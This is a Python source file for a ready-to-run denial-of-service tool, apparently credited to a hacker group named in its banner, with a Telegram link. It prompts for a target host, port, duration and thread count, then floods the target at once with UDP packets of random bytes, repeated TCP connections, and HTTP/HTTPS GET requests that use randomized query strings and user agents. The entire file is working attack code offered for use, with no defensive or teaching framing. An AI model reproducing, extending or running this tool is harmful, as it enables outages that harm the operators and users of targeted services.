import socket
import random
import threading
import time
import ssl  # أضفنا استيراد ssl
from colorama import Fore, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED} ______     __  __     __  __   
{Fore.YELLOW}/\  __ \   /\ \_\ \   /\ \/\ \  
{Fore.GREEN}\ \  __ \  \ \  __ \  \ \ \_\ \ 
{Fore.BLUE} \ \_\ \_\  \ \_\ \_\  \ \_____\\
{Fore.MAGENTA}  \/_/\/_/   \/_/\/_/   \/_____/
{Fore.CYAN}  Made by Team A.H.U | Netstat_stat
{Fore.WHITE}  Telegram: https://t.me/Arab_Hackers_Union
"""
    print(banner)

def udp_flood(target_ip, target_port, packet_size):
    while True:
        try:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.sendto(random.randbytes(packet_size), (target_ip, target_port))
        except Exception as e:
            print(f"{Fore.RED}[UDP Error] {e}")
        finally:
            udp_socket.close()

def tcp_flood(target_ip, target_port):
    while True:
        try:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.settimeout(5)  # إضافة Timeout
            tcp_socket.connect((target_ip, target_port))
            tcp_socket.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode())
            tcp_socket.close()
        except Exception as e:
            print(f"{Fore.RED}[TCP Error] {e}")

def http_flood(target_ip, target_port, use_https=False):
    while True:
        try:
            if use_https:
                context = ssl.create_default_context()
                sock = socket.create_connection((target_ip, target_port))
                ssock = context.wrap_socket(sock, server_hostname=target_ip)
            else:
                ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssock.connect((target_ip, target_port))

            user_agent = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "AppleWebKit/537.36 (KHTML, like Gecko)",
                "Chrome/91.0.4472.124 Safari/537.36"
            ])
            request = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {user_agent}\r\n\r\n"
            ssock.send(request.encode())
            ssock.close()
        except Exception as e:
            print(f"{Fore.RED}[HTTP/HTTPS Error] {e}")

def main():
    print_banner()
    
    target_ip = input(f"{Fore.YELLOW}[?] Target IP/DOMAIN: ")
    target_port = int(input(f"{Fore.YELLOW}[?] Target Port (80 for HTTP, 443 for HTTPS): "))
    duration = int(input(f"{Fore.YELLOW}[?] Duration (seconds): "))
    packet_size = int(input(f"{Fore.YELLOW}[?] UDP Packet Size (1-65500): "))
    threads_count = int(input(f"{Fore.YELLOW}[?] Threads (1-1000): "))
    use_https = input(f"{Fore.YELLOW}[?] Use HTTPS? (y/n): ").lower() == 'y'

    # حل المشكلة: التحقق من صحة العنوان
    try:
        socket.gethostbyname(target_ip)  # التحقق من صحة الاسم أو IP
    except socket.gaierror:
        print(f"{Fore.RED}[!] Invalid target IP/DOMAIN.")
        return

    print(f"{Fore.RED}[!] Starting attack on {target_ip}:{target_port} for {duration} seconds...")

    # Start UDP Flood
    for _ in range(threads_count // 2):
        threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size), daemon=True).start()

    # Start TCP Flood
    for _ in range(threads_count // 4):
        threading.Thread(target=tcp_flood, args=(target_ip, target_port), daemon=True).start()

    # Start HTTP/HTTPS Flood
    for _ in range(threads_count // 4):
        threading.Thread(target=http_flood, args=(target_ip, target_port, use_https), daemon=True).start()

    time.sleep(duration)
    print(f"{Fore.GREEN}[!] Attack completed successfully!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Attack stopped by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Critical Error: {e}")
